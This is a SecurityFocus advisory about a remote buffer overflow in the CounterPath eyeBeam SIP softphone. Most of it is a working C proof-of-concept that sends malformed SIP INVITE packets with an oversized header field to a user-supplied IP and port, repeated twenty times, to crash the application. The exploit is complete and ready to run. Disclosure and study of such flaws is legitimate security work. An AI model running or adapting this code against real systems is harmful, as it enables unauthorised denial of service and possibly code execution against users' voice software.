source: http://www.securityfocus.com/bid/16253/info
 
A remote buffer-overflow vulnerability affects CounterPath eyeBeam because the application fails to properly validate the length of user-supplied strings prior to copying them into static process buffers.
 
An attacker may exploit this issue to crash the affected application. Presumably, remote arbitrary code execution may also be possible. This may facilitate unauthorized access or privilege escalation.
 
Information regarding specific versions affected is currently unavailable. This BID will be updated as further information is disclosed. Note that the eyeBeam package has been re-branded and redistributed by other vendors.

/*********************************************************
eyeBeam handling SIP header DOS POC
Author : ZwelL
Email : zwell@sohu.com
Blog : http://www.donews.net/zwell
Data : 2006.1.15
*********************************************************/

#include <stdio.h>
#include "winsock2.h"

#pragma comment(lib, "ws2_32")

char *sendbuf1 =
"INVITE sip:a@127.0.0.1 SIP/2.0\r\n"
"Via: SIP/2.0/UDP 127.0.0.1:5060;branch=z9hG4bK00001249z9hG4bK.00004119\r\n"
"From: test <sip:a@127.0.0.1>;tag=1249\r\n"
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
"aaaaaaaa: test <sip:a@127.0.0.1>\r\n";

char *sendbuf2 =
"CSeq: 18571 INVITE\r\n"
"Expires: 1200\r\n"
"Max-Forwards: 70\r\n"
"Content-Type: application/sdp\r\n"
"Content-Length: 130\r\n"
"\r\n"
"v=0\r\n"
"o=1249 1249 1249 IN IP4 127.0.0.1\r\n"
"s=Session SDP\r\n"
"c=IN IP4 127.0.0.1\r\n"
"t=0 0\r\n"
"m=audio 9876 RTP/AVP 0\r\n"
"a=rtpmap:0 PCMU/8000\r\n";


int main(int argc, char **argv)
{
    WSADATA wsaData;
    SOCKET    sock;
    sockaddr_in RecvAddr;
        char sendbuf[4096];
        int iResult;
        int port = 8376; //default is 8376, but SIP's default port is 5060

        printf("eyeBeam handling SIP header DOS POC\nAuthor : ZwelL\n");
        printf("Email : zwell@sohu.com\nBlog : http://www.donews.net/zwell\n\n");
        if(argc < 2)
        {
                printf("Usage : %s <target ip> [port]\n", argv[0]);
                return 0;
        }

        if(argc == 3)
                port = atoi(argv[2]);

    iResult = WSAStartup(MAKEWORD(2,2), &wsaData);
    if (iResult != NO_ERROR)
        {
        printf("Error at WSAStartup()\n");
                return 0;
        }

        sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);

        ZeroMemory(&RecvAddr, sizeof(RecvAddr));
    RecvAddr.sin_family = AF_INET;
    RecvAddr.sin_port = htons((short)port);
    RecvAddr.sin_addr.s_addr = inet_addr(argv[1]);

        printf("Target is : %s\t port is : %d\r\n", argv[1], port);
        for(int i=0; i<20; i++)
        {
                sprintf(sendbuf, "%sCall-ID: 4166@<%s>\r\n%s", sendbuf1, argv[1], sendbuf2);
                if(SOCKET_ERROR == sendto(sock,
                                sendbuf,
                                strlen(sendbuf),
                                0,
                                (SOCKADDR *) &RecvAddr,
                                sizeof(RecvAddr)))
                {
                        printf("sendto wrong:%d\n", WSAGetLastError());
                        continue;
                }
        }

        printf("Now check the target is crafted?\r\n");

    WSACleanup();
    return 1;
}